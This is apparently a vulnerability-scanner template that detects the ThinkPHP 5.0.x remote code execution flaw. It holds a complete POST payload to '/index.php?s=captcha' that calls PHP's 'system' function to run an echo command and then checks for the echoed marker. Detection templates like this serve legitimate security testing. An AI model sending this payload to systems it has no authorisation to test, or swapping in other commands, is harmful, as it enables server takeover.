id: ThinkPHP-5-0-23-RCE
info:
  name: ThinkPHP 5.0.23 Remote Code Execution
  author: generated
  severity: critical
  description: ThinkPHP 5.0.x < 5.0.24 Remote Code Execution via captcha parameter.
  reference:
    - https://github.com/vulhub/vulhub/blob/master/thinkphp/5-rce/README.md
  tags: thinkphp,rce
rules:
  r0:
    request:
      method: POST
      path: /index.php?s=captcha
      headers:
        Content-Type: application/x-www-form-urlencoded
      body: "_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=echo 'ThinkPHP_RCE_Vulnerable'"
    expression: response.status == 200 && response.body.bcontains(b'ThinkPHP_RCE_Vulnerable')
expression: r0()
